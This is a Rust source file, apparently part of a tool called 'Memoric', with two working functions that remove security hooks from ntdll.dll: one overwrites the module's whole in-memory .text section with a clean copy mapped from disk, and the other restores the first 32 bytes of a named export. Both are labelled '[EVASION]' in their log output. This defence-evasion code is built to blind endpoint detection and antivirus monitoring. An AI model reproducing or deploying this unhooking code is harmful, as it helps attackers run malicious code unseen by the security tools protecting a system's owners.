//! ntdll unhooking - restore clean .text section from disk

use crate::error::MemoricError;
use serde_json::Value;

pub fn unhook_ntdll(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_FLAGS_AND_ATTRIBUTES, FILE_GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows::Win32::System::Memory::{
        CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualProtect, FILE_MAP_READ,
        PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    };

    tracing::warn!("[EVASION] Unhooking ntdll.dll by restoring clean .text from disk");

    unsafe {
        let path: Vec<u16> = "C:\\Windows\\System32\\ntdll.dll\0"
            .encode_utf16()
            .collect();
        let file = CreateFileW(
            windows::core::PCWSTR(path.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open ntdll: {}", e)))?;
        let file = crate::safe_handle::SafeHandle::new(file);

        let mapping = CreateFileMappingW(*file, None, PAGE_READONLY, 0, 0, None)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create mapping: {}", e)))?;
        let mapping = crate::safe_handle::SafeHandle::new(mapping);

        let disk_base = MapViewOfFile(*mapping, FILE_MAP_READ, 0, 0, 0);
        if disk_base.Value.is_null() {
            return Err(MemoricError::WindowsApi("Failed to map view".to_string()));
        }

        let disk_ptr = disk_base.Value as *const u8;
        let e_lfanew = *(disk_ptr.add(0x3C) as *const u32) as usize;
        let nt_headers = disk_ptr.add(e_lfanew);
        let optional_header = nt_headers.add(24);
        let num_sections = *(nt_headers.add(6) as *const u16);
        let section_header = optional_header.add(240);

        let mut text_rva = 0u32;
        let mut text_size = 0u32;

        for i in 0..num_sections {
            let section = section_header.add(i as usize * 40);
            let name = std::slice::from_raw_parts(section, 8);
            if &name[0..5] == b".text" {
                text_rva = *(section.add(12) as *const u32);
                text_size = *(section.add(8) as *const u32);
                break;
            }
        }

        if text_size == 0 {
            let _ = UnmapViewOfFile(disk_base);
            return Err(MemoricError::WindowsApi(
                ".text section not found".to_string(),
            ));
        }

        let mem_ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to get ntdll handle: {}", e)))?;
        let mem_base = mem_ntdll.0 as *mut u8;
        let mem_text = mem_base.add(text_rva as usize);

        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            mem_text as *const _,
            text_size as usize,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to change protection: {}", e)))?;

        std::ptr::copy_nonoverlapping(
            disk_ptr.add(text_rva as usize),
            mem_text,
            text_size as usize,
        );

        let _ = VirtualProtect(
            mem_text as *const _,
            text_size as usize,
            old_protect,
            &mut old_protect,
        );
        let _ = UnmapViewOfFile(disk_base);

        Ok(serde_json::json!({
            "success": true,
            "bytes_patched": text_size,
            "section_rva": format!("0x{:X}", text_rva),
            "message": "ntdll .text section restored from disk"
        }))
    }
}

/// Patch a single hooked function by restoring its clean prologue from disk.
/// Maps ntdll from disk, finds the function's clean bytes, and overwrites the hooked copy.
pub fn patch_single_function(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_FLAGS_AND_ATTRIBUTES, FILE_GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualProtect, FILE_MAP_READ,
        PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    };

    let function_name = args
        .get("function_name")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::WindowsApi("Missing function_name".to_string()))?;

    tracing::warn!("[EVASION] Patching single function: {}", function_name);

    let bytes_to_restore: usize = 32;

    unsafe {
        // Step 1: Map clean ntdll from disk
        let path: Vec<u16> = "C:\\Windows\\System32\\ntdll.dll\0"
            .encode_utf16()
            .collect();
        let file = CreateFileW(
            windows::core::PCWSTR(path.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open ntdll on disk: {}", e)))?;
        let file = crate::safe_handle::SafeHandle::new(file);

        let mapping = CreateFileMappingW(*file, None, PAGE_READONLY, 0, 0, None).map_err(|e| {
            MemoricError::WindowsApi(format!("Failed to create file mapping: {}", e))
        })?;
        let mapping = crate::safe_handle::SafeHandle::new(mapping);

        let disk_base = MapViewOfFile(*mapping, FILE_MAP_READ, 0, 0, 0);
        if disk_base.Value.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to map view of file".to_string(),
            ));
        }

        let disk_ptr = disk_base.Value as *const u8;

        // Step 2: Parse disk PE to find export directory and locate the function RVA
        let e_lfanew = *(disk_ptr.add(0x3C) as *const u32) as usize;
        let nt_headers = disk_ptr.add(e_lfanew);
        let opt_header = nt_headers.add(24);

        let export_rva = *(opt_header.add(112) as *const u32) as usize;
        let export_size = *(opt_header.add(116) as *const u32) as usize;

        if export_rva == 0 {
            let _ = UnmapViewOfFile(disk_base);
            return Err(MemoricError::WindowsApi(
                "No export directory in disk ntdll".to_string(),
            ));
        }

        let export_dir = disk_ptr.add(export_rva);
        let num_functions = *(export_dir.add(20) as *const u32) as usize;
        let num_names = *(export_dir.add(24) as *const u32) as usize;
        let functions_rva = *(export_dir.add(28) as *const u32) as usize;
        let names_rva = *(export_dir.add(32) as *const u32) as usize;
        let ordinals_rva = *(export_dir.add(36) as *const u32) as usize;

        let functions_ptr = disk_ptr.add(functions_rva) as *const u32;
        let names_ptr = disk_ptr.add(names_rva) as *const u32;
        let ordinals_ptr = disk_ptr.add(ordinals_rva) as *const u16;

        let mut func_rva: Option<usize> = None;
        for i in 0..num_names {
            let name_rva = *names_ptr.add(i) as usize;
            let name =
                std::ffi::CStr::from_ptr(disk_ptr.add(name_rva) as *const i8).to_string_lossy();
            if name == function_name {
                let ordinal = *ordinals_ptr.add(i) as usize;
                if ordinal < num_functions {
                    let rva = *functions_ptr.add(ordinal) as usize;
                    // Skip forwarded exports
                    if rva < export_rva || rva >= export_rva + export_size {
                        func_rva = Some(rva);
                    }
                }
                break;
            }
        }

        let func_rva = match func_rva {
            Some(rva) => rva,
            None => {
                let _ = UnmapViewOfFile(disk_base);
                return Err(MemoricError::WindowsApi(format!(
                    "Function '{}' not found in ntdll exports",
                    function_name
                )));
            }
        };

        // Step 3: Read clean bytes from disk
        let clean_bytes = std::slice::from_raw_parts(disk_ptr.add(func_rva), bytes_to_restore);

        // Step 4: Get in-memory function address
        let mem_ntdll =
            GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr())).map_err(|e| {
                let _ = UnmapViewOfFile(disk_base);
                MemoricError::WindowsApi(format!("GetModuleHandleA ntdll failed: {}", e))
            })?;

        let func_cstr = std::ffi::CString::new(function_name).map_err(|_| {
            let _ = UnmapViewOfFile(disk_base);
            MemoricError::WindowsApi("Invalid function name".to_string())
        })?;
        let mem_func = GetProcAddress(
            mem_ntdll,
            windows::core::PCSTR(func_cstr.as_ptr() as *const u8),
        );
        if mem_func.is_none() {
            let _ = UnmapViewOfFile(disk_base);
            return Err(MemoricError::WindowsApi(format!(
                "GetProcAddress('{}') failed",
                function_name
            )));
        }
        let mem_ptr = mem_func.unwrap() as *mut u8;

        // Step 5: Compare to detect hook
        let mem_bytes = std::slice::from_raw_parts(mem_ptr, bytes_to_restore);
        let was_hooked = mem_bytes != clean_bytes;

        let original_hex: String = mem_bytes
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");
        let clean_hex: String = clean_bytes
            .iter()
            .map(|b| format!("{:02X}", b))
            .collect::<Vec<_>>()
            .join(" ");

        // Step 6: Patch if hooked
        let bytes_restored = if was_hooked {
            let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
            VirtualProtect(
                mem_ptr as *const _,
                bytes_to_restore,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )
            .map_err(|e| {
                let _ = UnmapViewOfFile(disk_base);
                MemoricError::WindowsApi(format!("VirtualProtect RWX failed: {}", e))
            })?;

            std::ptr::copy_nonoverlapping(clean_bytes.as_ptr(), mem_ptr, bytes_to_restore);

            let _ = VirtualProtect(
                mem_ptr as *const _,
                bytes_to_restore,
                old_protect,
                &mut old_protect,
            );
            bytes_to_restore
        } else {
            0
        };

        let _ = UnmapViewOfFile(disk_base);

        Ok(serde_json::json!({
            "success": true,
            "function": function_name,
            "address": format!("0x{:016X}", mem_ptr as u64),
            "bytes_restored": bytes_restored,
            "was_hooked": was_hooked,
            "original_hex": original_hex,
            "clean_hex": clean_hex,
            "message": if was_hooked {
                format!("{} was hooked — {} bytes restored from clean disk copy", function_name, bytes_restored)
            } else {
                format!("{} is clean — no patching needed", function_name)
            }
        }))
    }
}
